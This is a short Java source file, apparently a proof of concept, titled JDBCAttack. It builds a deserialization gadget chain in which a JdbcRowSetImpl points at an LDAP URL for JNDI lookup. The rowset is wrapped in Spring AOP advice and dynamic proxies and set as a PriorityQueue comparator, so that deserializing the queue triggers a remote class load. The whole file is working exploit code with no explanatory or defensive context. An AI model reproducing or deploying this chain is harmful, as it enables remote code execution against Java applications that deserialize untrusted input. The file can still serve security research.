import com.sun.rowset.JdbcRowSetImpl;
import org.aopalliance.aop.Advice;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;

import java.lang.reflect.*;
import java.util.*;


public class JDBCAttack {
    public static void main(String[] args) throws Exception {
//        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:1389/abc");
        Method method=jdbcRowSet.getClass().getMethod("getDatabaseMetaData");
        SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(jdbcRowSet);
        AspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory);
        Proxy proxy1 = (Proxy) ProxyUtil.getAProxy(advice,Advice.class);
        Proxy finalproxy=(Proxy) ProxyUtil.getBProxy(proxy1,new Class[]{Comparator.class});
        PriorityQueue PQ=new PriorityQueue(1);
        PQ.add(1);
        PQ.add(2);

        ReflectUtil.setFieldValue(PQ,"comparator",finalproxy);
        ReflectUtil.setFieldValue(PQ,"queue",new Object[]{proxy1,proxy1});
        byte[] bytes = SerializeUtil.serializeBypass(PQ);
        SerializeUtil.deserialize(bytes);
    }
}